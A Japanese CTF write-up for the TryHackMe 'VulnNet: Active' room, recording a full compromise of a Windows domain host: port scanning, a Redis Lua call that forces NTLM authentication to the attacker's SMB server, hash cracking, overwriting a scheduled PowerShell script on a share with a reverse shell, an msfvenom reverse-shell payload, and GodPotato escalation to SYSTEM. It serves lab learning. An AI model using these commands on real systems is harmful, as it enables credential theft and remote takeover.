# VulnNet: Active CTF

https://tryhackme.com/room/vulnnetactive

## Enumeration

```shell
TARGET=10.10.220.143
```

### ポートスキャン

```shell
root@ip-10-10-208-215:~# sudo nmap -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-08 01:37 BST
Nmap scan report for vulnnet.thm (10.10.220.143)
Host is up (0.00038s latency).
Not shown: 65521 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
6379/tcp  open  redis
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49705/tcp open  unknown
MAC Address: 02:54:A6:7E:36:71 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.51 seconds
```

```sh
root@ip-10-10-208-215:~# sudo nmap -sV -p53,135,139,445,464,6379,9389 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-08 01:53 BST
Nmap scan report for vulnnet.thm (10.10.220.143)
Host is up (0.00038s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
6379/tcp open  redis         Redis key-value store 2.8.2402
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/8%Time=6844DF0A%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
MAC Address: 02:54:A6:7E:36:71 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## enum4linux

ドメイン名だけ判明

```sh
$ enum4linux -a $TARGET

 ================================( Getting domain SID for 10.10.220.143 )================================
                                                                                                                    
Domain Name: VULNNET                                                                                                
Domain Sid: S-1-5-21-1405206085-1650434706-76331420

[+] Host is part of a domain (not a workgroup) 
```

VULNNET.local を /etc/hosts に追加。

まずは有効なユーザー名を得る必要がある。

## ユーザー列挙

/usr/share/wordlists/seclists/Usernames/Names/names.txt は空振り。

```sh
$ kerbrute userenum --dc VULNNET.local -d VULNNET.local /usr/share/wordlists/seclists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/08/25 - Ronnie Flathers @ropnop

2025/06/08 10:04:45 >  Using KDC(s):
2025/06/08 10:04:45 >   VULNNET.local:88

2025/06/08 10:11:41 >  Done! Tested 10177 usernames (0 valid) in 416.595 seconds
```

```sh
$ rpcclient -U "" $TARGET -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### redis

```sh
$ redis-cli -h VULNNET.local -p 6379
VULNNET.local:6379> PING
PONG
VULNNET.local:6379> keys *
(empty array)
VULNNET.local:6379> info KEYSPACE
# Keyspace
VULNNET.local:6379> config get *
...
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
...
```

redisを、enterprise-securityユーザーが実行していることが分かった。

### ASREPRoasting 攻撃

試みたが、反応なしで失敗。

```sh
$ python3 /home/kali/tools/impacket/examples/GetNPUsers.py 'VULNNET/' -usersfile ./users.txt -no-pass -dc-ip $TARGET
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250605.14806.5f78065c - Copyright Fortra, LLC and its affiliated companies 

[-] [Errno Connection error (10.10.211.64:88)] [Errno 110] Connection timed out
```

## redisから攻撃マシンに認証させる

responder でキャプチャ開始

```sh
$ sudo responder -I tun0
```

コマンド実行

```sh
$ redis-cli -h VULNNET.local -p 6379                                                                         
VULNNET.local:6379> eval "dofile('//10.13.85.243/noexist')" 0
(error) ERR Error running script (call to f_6952e1221a04f5d9abe7f02d22bf011b58effd18): @user_script:1: cannot open //10.13.85.243/noexist: Permission denied 
(1.87s)
```

キャプチャ成功
```sh
[SMB] NTLMv2-SSP Client   : 10.10.211.64
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:[REDACTED]
```

これでパスワードを入手できたが、リモート接続はできなかった。

```sh
$ hashcat -m 5600 ./hash.txt /usr/share/wordlists/rockyou.txt --force
```

## SMB

```sh
$ smbclient -L //$TARGET -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.211.64 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Enterprise-Share から スクリプトをダウンロード

```sh
$ smbclient //$TARGET/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 07:45:41 2021
  ..                                  D        0  Wed Feb 24 07:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 09:33:18 2021

                9558271 blocks of size 4096. 5009153 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

このままでは使えないが、上書きできればスケジュールタスクとして実行される可能性がある。

```ps
$ cat ./PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

リバースシェルを上書き成功。

```sh
$ smbclient //$TARGET/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 07:45:41 2021
  ..                                  D        0  Wed Feb 24 07:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 09:33:18 2021
put 
                9558271 blocks of size 4096. 5008135 blocks available
smb: \> put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (1.0 kb/s) (average 1.0 kb/s)
smb: \> dir
  .                                   D        0  Wed Feb 24 07:45:41 2021
  ..                                  D        0  Wed Feb 24 07:45:41 2021
  PurgeIrrelevantData_1826.ps1        A      796  Sun Jun  8 11:35:08 2025
```

リバースシェル取得成功。

```sh
$ nc -nlvp 6666        
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.211.64] 50155
whoami
vulnnet\enterprise-security
```

metepreter に昇格する。

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=8888 -f exe
```

これをsmbでアップロードし、リッスン。

```sh
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.13.85.243; set LPORT 8888;exploit"
```

## 権限昇格

権限

```sh
C:\Users\enterprise-security\Downloads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

SeImpersonatePrivilege が有効になっている。

### GodPotato

https://github.com/BeichenDream/GodPotato

```sh
C:\Users\enterprise-security\Downloads>GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140735991447552
[*] DispatchTable: 0x140735993765040
[*] UseProtseqFunction: 0x140735993143936
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\fb512e1c-ab52-4d52-8eba-0965b2aec3db\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005002-07c0-ffff-23b0-5f6b1683b725
[*] DCOM obj OXID: 0x964691a7a50b28a
[*] DCOM obj OID: 0x309d8a25af5df82a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 864 Token:0x796  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3580
```

フラグファイルのパスが分かっているので直接出力する。

```sh
C:\Users\enterprise-security\Downloads>GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
[*] CombaseModule: 0x140735991447552
[*] DispatchTable: 0x140735993765040
[*] UseProtseqFunction: 0x140735993143936
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\cc2a06b6-3092-463d-883d-b15d9d01f861\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000002-05a4-ffff-653c-6b01000a8eea
[*] DCOM obj OXID: 0x5a55e08360489989
[*] DCOM obj OID: 0x5f1223b32ac714d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 864 Token:0x796  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1520
THM{.............................}
```

## 振り返り

- redis で役に立つ情報が出てきたのも初めてで、認証情報を送信させるテクニックも初見。
- GodPotato も覚えておきたい。
